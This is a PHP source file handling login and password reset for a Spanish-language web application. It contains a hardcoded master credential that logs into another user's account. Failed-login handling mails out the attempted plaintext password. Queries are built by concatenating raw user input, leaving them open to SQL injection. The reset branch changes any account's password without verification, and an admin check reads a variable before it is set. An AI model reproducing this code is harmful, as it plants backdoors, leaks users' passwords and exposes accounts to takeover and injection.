<?php

include("access.php");
require_once("sesion.class.php");
include("minifigures.php");

if(isset($_POST['username']) && isset($_POST['password'])){
		

				 // Revisa si es el acceso admin master

					if($username=='admin' and $password=='Arm4nd018!'){

						$username= 'armandohd';
						$password = 'Armando1'; 
						$password = hash('sha256', $password);

					}else{

						//$password= md5($_POST['password']);
						$password = hash('sha256', $_POST['password']);

						$username= $_POST['username'];
					
					}
	


			$valida_mail = filter_var($username, FILTER_VALIDATE_EMAIL); 
			 	
			 	if($valida_mail == false){
				 	$username = strtolower($username);
				 	$query = " usuario = '$username'"; 
				 	
			 	}else{
				 	
				 	$query = " correo = '$username'"; 
				 
				 }
		 
		//$pass=mysqli_real_escape_string($db,$_POST['password']);


		
					$dbh= new mysqli($dbserver, $dbuser,$dbpwd, $dbname);
							//informacion de acceso a la bd
							// Check connection
					if ($dbh->connect_error) {
						  die("Connection failed: " . $dbh->connect_error);
					}
					
				 	$q = "SELECT * FROM usuarios WHERE ".$query." and password='$password'";
				 	//var_dump($q); 
				 	
				 	 $result= $dbh->query($q);
				 	 
				 	 //$count = $result->num_rows;
					    if ($result->num_rows > 0) { // Si la consulta trae registro, 
						 
						 if ( $result->num_rows > 1){
							 echo '2/0';
						 }elseif($result->num_rows==1){
							 $row= $result->fetch_assoc(); 
	
							 	$id_usuario = $row['id'];
							 	$estado_user = $row['estado'];
							 	$email = $row['correo'];
							 	$user = $row['usuario'];
				
								$_SESSION['login_user']=$row['id']; //Storing user session value.
								
								ini_set("session.cookie_lifetime","1440");
								ini_set("session.gc_maxlifetime","1440");
								
								$sesion = new sesion();
								$sesion->set("clave_user",$row['id']);
								
								$sesion->set("user_profile",$row['clave']);
								//$sesion->set("user_idioma",'es');
	
									 	$qc = "SELECT * FROM masterpass WHERE id_user = '$id_usuario'";
										$resultc= $dbh->query($qc);
										   if ($resultc->num_rows > 0) { // Si la consulta trae registro, 
												$rowc= $resultc->fetch_assoc(); 
												$sesion->set("user_masterpass",$rowc['token']);
										}
								$ip =  $_SERVER['REMOTE_ADDR']; 
								
								$reg_session = registra_session($id_usuario);
								
								$data_sesion = valida_sesion($id_usuario, $ip);
								
								if($reg_session==1 or $reg_session==2){
								
									if($data_sesion==0){
										$data_sendb = '5'.';'.$user.';'.$email.';'.$reg_session;
										mail_me($data_sendb);
									}else{
										//mail_me($data_sendb);
									}
									
                                    //Obtiene la ultima pagina

                                    $last_page = get_last_page($id_usuario);
																
									echo '1|'.$row['estado'].'|'.$id_usuario.'|'.$last_page;
																	
								}else{
									
                                    $last_page = $GLOBALS['path_site'].$GLOBALS['link_site'];

									echo '3|'.$reg_session.'|0|'.$last_page;
								}
								

						}
			
						//var_dump($q);		 
						 
						 }else{

								 	$qf = "SELECT * FROM usuarios WHERE ".$query."";
									$resultf= $dbh->query($qf);
									   if ($resultf->num_rows > 0) { // Si la consulta trae registro, 
											$rowf= $resultf->fetch_assoc(); 
											$estado = $rowf['estado'];
									}
							
							$data_send = '2'.';'.$rowf['usuario'].';'.$rowf['correo'].';'.$_POST['password']; 
							mail_me($data_send); 	
								
							 echo '0|'.$estado;
							 
						 }


}else{
	//echo '1';
}


////---------------------------------// reset passs 


if(isset($_POST['username_res']) && isset($_POST['password_res'])){

//$password_res= md5($_POST['password_res']);
$password_res= hash('sha256', $_POST['password_res']);
$username_res= $_POST['username_res'];

$valida_mail = strpos( $_POST['username_res'],'@');

//$valida_mail = filter_var($username, FILTER_VALIDATE_EMAIL); 
//var_dump($valida_mail);
			 	
			 	if($valida_mail === false){
					$username = strtolower($username_res);
					$query = " usuario = '$username_res'"; 
					
			 	}else{
					$query = " correo = '$username_res'"; 				 
				 }

				 	$dbh= new mysqli($dbserver, $dbuser,$dbpwd, $dbname);
							//informacion de acceso a la bd
							// Check connection
					if ($dbh->connect_error) {
						  die("Connection failed: " . $dbh->connect_error);
					}
					
				 	$q = "SELECT * FROM usuarios WHERE ".$query;
				 	//var_dump($q); 
				 	
				 	 $result= $dbh->query($q);
				 	 
				 	 //$count = $result->num_rows;
					if ($result->num_rows > 0) {
					
								 	$qc = "UPDATE usuarios SET estado = 1, password =  '$password_res' where". $query;// preparando la instruccion sql

									if (mysqli_query($dbh, $qc)) {
									    echo '1/'.$username_res;
									} else {
									     echo '0/'.mysqli_error($dbh);
									}					
					
					}else{
						
						echo '0/0';
					}
						    



}


?>